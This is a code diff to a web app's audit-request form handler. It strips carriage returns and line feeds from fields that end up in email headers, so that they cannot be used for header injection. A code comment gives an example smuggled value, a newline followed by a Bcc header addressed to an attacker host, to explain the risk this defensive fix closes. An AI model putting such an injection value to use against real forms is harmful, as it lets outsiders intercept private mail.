@@ -351,9 +351,16 @@ router.post('/audit-request', auditLimiter, async (req, res) => {
     // Validation — fail-fast on missing essentials. Loose email regex
     // (anything@anything.anything) because we'd rather a typo'd lead reach
     // the founder than reject a real prospect.
-    const cleanEmail = String(email || '').trim().toLowerCase().slice(0, 254);
-    const cleanBizName = String(businessName || '').trim().slice(0, 200);
-    const cleanBizUrl = String(businessUrl || '').trim().slice(0, 1000);
+    //
+    // Strip CR/LF from anything that ends up in an email HEADER (Subject,
+    // To, From, Reply-To). Without this, a prospect submitting a businessName
+    // containing "\r\nBcc: attacker@evil.tld" could inject extra headers and
+    // exfiltrate the founder's lead-notification mail to a third party. Body
+    // fields can contain newlines safely, so cleanNotes is left alone.
+    const stripHeaderChars = (s) => String(s ?? '').replace(/[\r\n]/g, ' ');
+    const cleanEmail = stripHeaderChars(String(email || '').trim().toLowerCase().slice(0, 254));
+    const cleanBizName = stripHeaderChars(String(businessName || '').trim().slice(0, 200));
+    const cleanBizUrl = stripHeaderChars(String(businessUrl || '').trim().slice(0, 1000));
     const cleanNotes = String(notes || '').trim().slice(0, 2000);
 
     if (!cleanEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
